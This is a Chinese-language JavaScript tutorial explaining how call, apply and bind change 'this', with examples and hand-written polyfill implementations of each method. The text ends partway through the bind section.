<h2 id="call和apply的区别"><a href="#call和apply的区别" class="headerlink" title="call和apply的区别"></a>call和apply的区别</h2><p>本质：改变 <code>this</code> 的指向<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// apply()方法：调用一个对象的一个方法，用另一个对象替换当前对象。</span></span><br><span class="line"><span class="comment">// 例如：B.apply(A, arguments); 即A对象应用B对象的方法。</span></span><br><span class="line">func.apply(thisObj[, argArray]); <span class="comment">// 2个参数，参数2为数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// call()方法：调用一个对象的一个方法，用另一个对象替换当前对象。</span></span><br><span class="line"><span class="comment">// 例如：B.call(A, args1,args2); 即A对象调用B对象的方法。</span></span><br><span class="line">func.call(thisObj[, arg1[, arg2[, [, ...argN]]]]); <span class="comment">// 多个参数，其他参数为非数组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数1 thisObj 是可选的。在 func 函数运行时使用的 this 值。请注意，this 可能不是该方法看到的实际值：如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动替换为指向全局对象(window)，原始值会被包装。</span></span><br></pre></td></tr></table></figure></p>
<p>1、举例用途1：获取数组中最大最小值<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// apply会将参数2的数组装换成一个个的参数，如将下例中的[1, 2, 3, 4]转换成1, 2, 3, 4.</span></span><br><span class="line"><span class="built_in">Math</span>.max.apply(<span class="literal">null</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]); <span class="comment">// 参数1可写成null、undefined、this、Math、window</span></span><br><span class="line"><span class="built_in">Math</span>.min.apply(<span class="literal">null</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]);</span><br></pre></td></tr></table></figure></p>
<p>2、举例用途2：拼接数组<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>);</span><br><span class="line"><span class="keyword">var</span> arr2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>);</span><br><span class="line"><span class="built_in">Array</span>.prototype.push.apply(arr1, arr2); <span class="comment">// 返回数组长度 6</span></span><br><span class="line">arr1.push.apply(arr1, arr2); <span class="comment">// arr1: ["1", "2", "3", "4", "5", "6"], arr1对象调用Array的push方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 上面的等同于</span></span><br><span class="line">arr1.push(...arr2); <span class="comment">// ES6语法</span></span><br><span class="line">arr1.concat(arr2); <span class="comment">// ES5语法</span></span><br></pre></td></tr></table></figure></p>
<p>3、举例3：面试题<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现一个log方法，传入不定的参数，内部打印出console.log()日志</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span> (<span class="params">...args</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(...args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// arguments输出的是一个数组，...arguments等到的是不定参数</span></span><br><span class="line">  <span class="built_in">console</span>.log.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">&#125;</span><br><span class="line">log(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br></pre></td></tr></table></figure></p>
<p>1.) <code>console.log</code> 挂载在 <code>window</code> 下<br>2.) <code>this</code> 的指向需要看上下文，一开始 <code>this</code> 指向 <code>window</code><br>3.) 使用 <code>apply</code> 将log方法中 <code>this</code> 指向 <code>widnow</code> 变成指向 <code>console</code><br>4.) 参数1本例中可以使用 <code>null</code>、<code>undefined</code>、<code>this</code>、<code>window</code>、<code>console</code>，他表示在 <code>console.log</code> 运行时的 <code>this</code> 指向</p>
<p>4、严格模式 + 非严格模式<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"> a, b </span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log( <span class="keyword">this</span> )</span><br><span class="line">&#125;</span><br><span class="line">fn(<span class="number">1</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure></p>
<p>1.) 严格模式下 <code>this</code> 指向 <code>undefined</code><br>2.) 非严格模式下 <code>this</code> 会被转成全局的 <code>window</code></p>
<hr>
<h2 id="call、apply、bind"><a href="#call、apply、bind" class="headerlink" title="call、apply、bind"></a>call、apply、bind</h2><blockquote>
<p>参考：<a href="https://www.cnblogs.com/zhg277245485/p/6559475.html" target="_blank" rel="noopener">博客园 call,apply,bind</a></p>
</blockquote>
<p><code>call</code> 、<code>apply</code> 、<code>bind</code> 是 <code>Function</code> 对象自带的三个方法，都是为了改变函数体内部 <code>this</code> 的指向；<br><code>call</code> 、<code>apply</code> 、<code>bind</code> 三者第一个参数都是 <code>this</code> 要指向的对象，也就是想指定的上下文；<br><code>call</code> 、<code>apply</code> 、<code>bind</code> 三者都可以利用后续参数传参；<br><code>bind</code> 是返回对应 函数，需要手动调用；<code>apply</code> 、<code>call</code> 则是立即调用。</p>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fruits</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">fruits.prototype = &#123;</span><br><span class="line">  color: <span class="string">'red'</span>,</span><br><span class="line">  say: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'My color is '</span> + <span class="keyword">this</span>.color); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> apple = <span class="keyword">new</span> fruits; <span class="comment">// 不传参时括号可以省略</span></span><br><span class="line">apple.say();   <span class="comment">// 此时方法里面的 this 指的是 fruits</span></span><br><span class="line"><span class="comment">// 结果： My color is red</span></span><br></pre></td></tr></table></figure>
<p>  如果我们有一个对象 <code>banana = {color : &#39;yellow&#39;}</code> ,我们不想重新定义 <code>say</code> 方法，那么我们可以通过 <code>call</code> 或 <code>apply</code> 来使用 <code>apple</code> 的 <code>say</code> 方法：<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> banana = &#123;</span><br><span class="line">  color: <span class="string">'yellow'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">apple.say.call(banana); <span class="comment">// 此时的 this 的指向已经同过 call() 方法改变了，指向的是 banana</span></span><br><span class="line"><span class="comment">// 结果： My color is yellow</span></span><br><span class="line"></span><br><span class="line">apple.say.apply(banana); <span class="comment">// 此时的 this 的指向已经同过 apply() 方法改变了，指向的是 banana</span></span><br><span class="line"><span class="comment">// 结果： My color is yellow</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果参数传null</span></span><br><span class="line">apple.say.apply(<span class="literal">null</span>); <span class="comment">// 因为 null 是 window 下的，所以此时 this 指向了 window</span></span><br><span class="line"><span class="comment">// 结果： My color is undefined</span></span><br></pre></td></tr></table></figure></p>
<h3 id="call、apply传参"><a href="#call、apply传参" class="headerlink" title="call、apply传参"></a>call、apply传参</h3>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>];</span><br><span class="line"><span class="keyword">var</span> arr3 = [<span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>];</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">'16'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一种：</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.push.apply(arr1, arr2); <span class="comment">// 10</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1); <span class="comment">// [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.prototype.push.call(arr1, arr2); <span class="comment">// 6</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1); <span class="comment">// [1, 2, 3, 4, 5, [6, 7, 8, 9, 10]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种：</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.push.apply(arr1, arr2, arr3); <span class="comment">// 10</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1); <span class="comment">// [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.prototype.push.call(arr1, arr2, arr3); <span class="comment">// 7</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1) <span class="comment">// [1, 2, 3, 4, 5, [6, 7, 8, 9, 10], [11, 12, 13, 14, 15]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三种：</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.push.apply(arr1, str);</span><br><span class="line"><span class="built_in">console</span>.log(arr1); <span class="comment">// Uncaught TypeError: CreateListFromArrayLike called on non-object</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.prototype.push.call(arr1, str); <span class="comment">// 6</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1); <span class="comment">// [1, 2, 3, 4, 5, "21"]</span></span><br></pre></td></tr></table></figure>
<p>  <code>call</code> 参数可以传多个，从第二个参数开始，<code>call</code> 会把他们当成一个元素，和它们本身的类型无关，<code>call</code> 的参数都是事先就知道的<br>  <code>apply</code> 参数可以传两个，且第二个参数必须使用 <code>Array</code>，<code>apply</code> 的参数可以是不定的（第二个参数内不定）<br>  <code>call</code> 和 <code>apply</code> 唯一的区别就是参数不同， <code>call</code> 可以传多个参数，<code>apply</code> 只能传两个且第二个是数组</p>
<h3 id="bind方法"><a href="#bind方法" class="headerlink" title="bind方法"></a>bind方法</h3><p>  bind方法会创建一个新函数，称之为绑定函数。当调用这个绑定函数时，绑定函数会将创建它时传入 <code>bind()</code> 方法的第一个参数作为 <code>this</code>，传入 <code>bind()</code> 方法的第二个及以后的参数加上绑定函数运行时本身的参数按照顺序作为原函数的参数来调用原函数。<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.x);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">  x:<span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">bar(); <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">var</span> func = bar.bind(foo); <span class="comment">// 将foo对象绑定给bar，此时this会指向foo. 但是用bind() 方法并不会立即执行，而是创建一个新函数，如果要直接调用的话，可以 bar.bind(foo)();</span></span><br><span class="line"></span><br><span class="line">func(); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure></p>
<p>  在 <code>JavaScript</code> 中，多次使用 <code>bind()</code> 是无效的。<code>bind()</code> 的实现相当于在内部包了一个 <code>call</code> 或 <code>apply</code>，第二次 <code>bind()</code> 相当于再包住第一次 <code>bind()</code>，所有第二次以后的 <code>bind()</code> 是无法生效的。<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.x);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">  x:<span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> sed = &#123;</span><br><span class="line">  x:<span class="number">4</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = bar.bind(foo).bind(sed); <span class="comment">// 使用两次bind()</span></span><br><span class="line">func(); <span class="comment">// 3 第二次以后的bind()是无效的</span></span><br></pre></td></tr></table></figure></p>
<h3 id="call、apply、bind异同"><a href="#call、apply、bind异同" class="headerlink" title="call、apply、bind异同"></a>call、apply、bind异同</h3>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  x: <span class="number">5</span>,</span><br><span class="line">&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">  getX: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo.getX.bind(obj)());  <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.getX.call(obj));    <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.getX.apply(obj));   <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
<h3 id="如何选用"><a href="#如何选用" class="headerlink" title="如何选用"></a>如何选用</h3><p>  如果不需要关心具体有多少参数传入函数，选用 <code>apply()</code>;<br>  如果确定函数可以接受多少个参数，并且想一目了然的知道形参和实参的的对应关系，选用 <code>call()</code>;<br>  如果不需要立即执行，将来手动调用时，选用 <code>bind()()</code>;</p>
<h3 id="手动模拟实现call、apply、bind"><a href="#手动模拟实现call、apply、bind" class="headerlink" title="手动模拟实现call、apply、bind"></a>手动模拟实现call、apply、bind</h3><blockquote>
<p>参考：<a href="https://www.jianshu.com/p/3b69fb0d4c2f" target="_blank" rel="noopener">简书 手动实现call, apply, bind</a></p>
</blockquote>
<ol>
<li><p>模拟前须知</p>
<p>首先我们知道，对象上的方法，在调用时，<code>this</code> 是指向对象的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o = &#123;</span><br><span class="line">  fn:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">o.fn() <span class="comment">//  Object &#123;fn: function&#125;</span></span><br></pre></td></tr></table></figure>
<p>知道了这点，我们就可以实现改变 <code>this</code> 指向了</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数原型上添加 myCall方法 来模拟call</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.myCall = <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//我们要让传入的obj成为, 函数调用时的this值.</span></span><br><span class="line">  obj._fn_ = <span class="keyword">this</span>;  <span class="comment">//在obj上添加_fn_属性，值是this(要调用此方法的那个函数对象)。</span></span><br><span class="line">  obj._fn_();       <span class="comment">//在obj上调用函数,那函数的this值就是obj.</span></span><br><span class="line">  <span class="keyword">delete</span> obj._fn_; <span class="comment">// 再删除obj的_fn_属性,去除影响.</span></span><br><span class="line">  <span class="comment">//_fn_ 只是个属性名 你可以随意起名，但是要注意可能会覆盖obj上本来就有的属性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> test = &#123;</span><br><span class="line">  name:<span class="string">'test'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o = &#123;</span><br><span class="line">  name:<span class="string">'o'</span>,</span><br><span class="line">  fn:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">o.fn() <span class="comment">// "o"</span></span><br><span class="line">o.fn.call(test) <span class="comment">// "test"</span></span><br><span class="line">o.fn.myCall(test) <span class="comment">// "test"</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol start="2">
<li><p>模拟call<br>2.1 es6</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myCall = <span class="function"><span class="keyword">function</span>(<span class="params">obj, ...arg</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 传参检测</span></span><br><span class="line">  <span class="keyword">if</span>(obj === <span class="literal">null</span> || obj === <span class="literal">undefined</span>)&#123;</span><br><span class="line">    obj = <span class="built_in">window</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    obj = <span class="built_in">Object</span>(obj);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> val ;</span><br><span class="line">  obj._fn_ = <span class="keyword">this</span>;</span><br><span class="line">  val = obj._fn_(...arg);  <span class="comment">//不能直接return obj._fn_(...arg) 这样就不delete属性了</span></span><br><span class="line">  <span class="keyword">delete</span> obj._fn_;</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="keyword">let</span> test = &#123;</span><br><span class="line">  name: <span class="string">'test'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o = &#123;</span><br><span class="line">  name:<span class="string">'o'</span>,</span><br><span class="line">  fn: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name, ...arguments);  <span class="comment">//这里把参数显示一下</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.fn(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment">// "o" 1 2 3</span></span><br><span class="line">o.fn.call(test, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment">// "test" 1 2 3</span></span><br><span class="line">o.fn.myCall(test, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment">// "test" 1 2 3</span></span><br><span class="line"><span class="comment">// 没问题</span></span><br></pre></td></tr></table></figure>
<p>2.2 非es6</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myCall = <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arg = [];</span><br><span class="line">  <span class="keyword">let</span> val ;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="built_in">arguments</span>.length; i++)&#123;</span><br><span class="line">    arg.push( <span class="string">'arguments['</span> + i + <span class="string">']'</span> ) ;</span><br><span class="line">  &#125;</span><br><span class="line">  obj._fn_ = <span class="keyword">this</span>;</span><br><span class="line">  val = <span class="built_in">eval</span>( <span class="string">'obj._fn_('</span> + arg + <span class="string">')'</span> ) </span><br><span class="line">  <span class="keyword">delete</span> obj._fn_;</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>模拟apply<br>3.1 es6 + myCall方法</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myApply = <span class="function"><span class="keyword">function</span>(<span class="params">obj, arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> args = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</span><br><span class="line">    args.push( arr[i] );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 其实直接 ...arr 传参也可以 但是效果就和aplly有微小差别了</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.myCall(obj, ...args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3.2 非es6 + myCall方法</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myApply = <span class="function"><span class="keyword">function</span>(<span class="params">obj, arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> args = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</span><br><span class="line">    args.push( <span class="string">'arr['</span> + i + <span class="string">']'</span> );  <span class="comment">// 这里也是push 字符串</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>( <span class="string">'this.myCall(obj,'</span> + args + <span class="string">')'</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3.3 非es6</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myApply = <span class="function"><span class="keyword">function</span>(<span class="params">obj, arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> args = [];</span><br><span class="line">  <span class="keyword">let</span> val ;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</span><br><span class="line">    args.push( <span class="string">'arr['</span> + i + <span class="string">']'</span> ) ;</span><br><span class="line">  &#125;</span><br><span class="line">  obj._fn_ = <span class="keyword">this</span>;</span><br><span class="line">  val = <span class="built_in">eval</span>( <span class="string">'obj._fn_('</span> + args + <span class="string">')'</span> ) </span><br><span class="line">  <span class="keyword">delete</span> obj._fn_;</span><br><span class="line">  <span class="keyword">return</span> val</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>模拟bind<br>4.1 es6 + myApply方法</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myBind = <span class="function"><span class="keyword">function</span>(<span class="params">obj,...arg1</span>)</span>&#123;   <span class="comment">//arg1收集剩余参数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">...arg2</span>) =&gt;</span> &#123;   <span class="comment">//返回箭头函数, this绑定调用这个方法(myFind)的函数对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.myApply( obj, arg1.concat(arg2) );   <span class="comment">// 将参数合并</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>4.2 es6</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myBind = <span class="function"><span class="keyword">function</span>(<span class="params">obj, ...arg1</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">...arg2</span>) =&gt;</span> &#123; </span><br><span class="line">    <span class="keyword">let</span> args = arg1.concat(arg2);</span><br><span class="line">    <span class="keyword">let</span> val ;</span><br><span class="line">    obj._fn_ = <span class="keyword">this</span>;</span><br><span class="line">    val = obj._fn_( ...args ); </span><br><span class="line">    <span class="keyword">delete</span> obj._fn_;</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>4.3 非es6</p>
